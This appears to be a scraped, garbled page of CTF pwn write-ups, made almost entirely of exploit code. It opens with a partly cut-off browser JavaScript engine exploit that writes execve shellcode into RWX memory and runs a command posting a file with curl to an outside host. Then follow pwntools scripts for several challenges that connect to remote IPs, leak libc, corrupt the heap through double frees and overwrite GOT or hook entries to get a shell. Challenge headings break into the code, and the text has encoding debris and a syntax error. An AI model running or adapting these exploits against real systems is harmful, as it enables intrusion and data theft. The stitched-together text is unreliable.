          return addr;
        }
      };
      a.oob(o);
      return a[5];
    }
    // leak needed, this should be contiguous, otherwise we die
    // also: do NOT trigger GC if you want this primitive enabled
    var kkk = [];
    for(var i = 0; i  /tmp/hello; curl -F \"data=@/tmp/hello\" 
http://shiki7.me:9999/'";
    var cmd_buf = new ArrayBuffer(0x100);
    var cmd_view = new Uint8Array(cmd_buf);
    cmd_view.set(Array.from(command).map((c) => c.charCodeAt(0)));
    var buf_addr = Sub(addrof(cmd_buf), Int64.One);
    var cmd_addr = rw.read8(Add(buf_addr, new Int64(0x20)));
    var shellcode = [].concat([0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90], 
[72,49,210,72,184,47,98,105,110,47,115,104,0,80,72,137,231,184,45,99,0,0,80,72,137,225,72,184], 
Array.from(cmd_addr.bytes()), [82,80,81,87,72,137,230,184,59,0,0,0,15,5]);
    //alert('Pause!')
    rw.write(rwx_memory, shellcode);
    f();
    //alert('Done!');
girlfriend
Status: Completed Tags: Pwn
from pwn import *
context.arch = 'amd64'
# p = process('./shellcode')
p = remote('34.92.37.22', 10002)
â€¢def launch_gdb():
     context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
     gdb.attach(proc.pidof(p)[0])
shellcode = '\x79\x0f\x00' # jmp 
shellcode += '\x90' * 50 + asm(shellcraft.amd64.sh())
# launch_gdb()
p.send(shellcode)
p.interactive()
from pwn import *
#p=process('./chall',env = {'LD_PRELOAD':'./libc.so.6'})
p=remote('34.92.96.238',10001)
libc = ELF('./libc.so.6')
def add(size,name,phone):
    p.recvuntil('choice')
    p.sendline('1')
    p.recvuntil('name')
    p.sendline(str(size)
    p.recvuntil('name')
    p.send(name)
    p.recvuntil('call')
    p.send(phone)
def dele(idx):
    p.recvuntil('choice')
    p.sendline('4')
    p.recvuntil('index')
    p.sendline(str(idx))
add(0x500,'aaa','111')
add(0x500,'bbb','222')
dele(0)
p.recvuntil('choice')
p.sendline('2')
p.recvuntil('index')
p.sendline('0')
p.recvuntil('name:\n')
addr = u64(p.recv(6).ljust(8,'\x00'))
print hex(addr)
raw_input()
libc_base = addr - (0x7fd7cae71ca0-0x7fd7caac0000)
malloc_hook = libc.symbols['__free_hook']+libc_base
system = libc.symbols['system']+libc_base
print hex(malloc_hook)
info("libc:0x%x",libc_base)
for i in range(7):
    add(0x60,'xxx','111')#2,3,4,5,6 7 8
add(0x60,'yyy','222')#9
add(0x60,'zzz','333')#10
for i in range(2,9):
    dele(i)
dele(9)
dele(10)
dele(9)
quicksort
Status: Completed Tags: Pwn
upxofcpp
Status: Completed Tags: Pwn
for i in range(7):
    add(0x60,'xxx','111')#11,12,13,14,15 16 17
raw_input()
add(0x60,p64(malloc_hook),'111')#18
add(0x60,p64(malloc_hook),'111')#19
add(0x60,"/bin/sh\x00",'111')#20
add(0x60,p64(system),'22')#21
dele(20)
#add(0x60,p64(malloc_hook-0x20-3),'111')
p.interactive()
from pwn import *
#p = process('./quicksort')
libc = ELF("./libc.so.6")
p = remote('34.92.96.238',10000)
p.recvuntil('sort')
p.sendline('1')
p.recvuntil('number')
p.sendline(str(0x8048816).ljust(12,'\x00')+p32(1)*2+p32(0)*2+p32(0x804a018))
#                                           n          i
#change free to main
p.recvuntil('sort')
p.sendline('1')
p.recvuntil('number')
p.sendline(str(0x8048816).ljust(12,'\x00')+p32(1)*2+p32(1)*2+p32(0x804a02c))
p.recvuntil(':\n')
addr = int(p.recvuntil('\n')[:-1])&0xffffffff
libc_base = addr - libc.symbols['puts']
info("libc:0x%x",libc_base)
system = libc_base+libc.symbols['system']
print hex(system)
sh = libc_base +next(libc.search("/bin/sh"),)
p.recvuntil('sort')
p.sendline('1')
p.recvuntil('number')
addr = 0x100000000-system
addr = 0-addr
print addr
print hex(addr&0xffffffff)
p.sendline(str(addr).ljust(12,'\x00')+p32(1)*2+p32(0)*2+p32(0x804a038))
p.recvuntil('sort')
p.sendline('1')
p.recvuntil('number')
p.sendline('/bin/sh')
p.interactive()
from pwn import *
import re
#p = process('./upxofcpp')
blind pwn
Status: Completed Tags: Pwn
p = remote('34.92.121.149', 10000)
context(arch='amd64',os='linux')
sh = asm(shellcraft.sh())
print len(sh)
def split_s(text,lenth):
    textArr = re.findall('.{'+str(lenth)+'}', text)
    textArr.append(text[(len(textArr)*lenth):])
    return textArr
def add(idx,size,content):
    p.recvuntil('choice')
    p.sendline('1')
    p.recvuntil('Index')
    p.sendline(str(idx))
    p.recvuntil('Size')
    p.sendline(str(size))
    l = split_s(content,4)
    if len(content) == 0:
        p.sendline('-1')
        return
    for i in l:
        num = u32(i.ljust(4,'\x00'))
        if num >=0x80000000:
            num = 0x100000000-num
            num = -num
        p.sendline(str(num))
    if (len(l)
     .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-